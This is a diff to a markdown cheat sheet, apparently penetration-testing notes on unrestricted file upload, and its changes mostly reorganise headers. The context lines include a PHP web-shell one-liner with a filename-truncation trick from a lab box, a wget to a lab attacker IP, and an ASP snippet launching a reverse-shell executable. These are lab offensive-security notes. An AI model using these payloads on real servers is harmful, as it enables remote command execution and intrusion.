@@ -1,14 +1,14 @@
 ---
-description: Different ways to upload files and get RCE.
+title: Unrestricted File Upload
+category: Web
+order: 6
 ---
 
-# Unrestricted File Upload
+Different ways to upload files and get RCE.
 
-## Introduction
+# Identifies restrictions
 
-## Identifies restrictions
-
-### Extension
+## Extension
 
 Shortening the size (falafel.htb):
 
@@ -26,15 +26,15 @@ echo '<?php system($_GET["cmd"]);?>' > $(python3 -c 'print("A"*(236-4)+".php.png
 wget 'http://10.10.14.20:8000/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.png'
 ```
 
-### Size
+## Size
 
-### Name
+## Name
 
-### Magic Number
+## Magic Number
 
-### Content
+## Content
 
-## ASP
+# ASP
 
 First we need to generate the reverse shell.
 
@@ -53,7 +53,7 @@ Call oS.Run("win.com cmd.exe /c c:\Inetpub\rev.exe",0,True)
 %>
 ```
 
-## .config RCE (IIS)
+# .config RCE (IIS)
 
 Uploading a `web.config` file to execute asp commands.
 
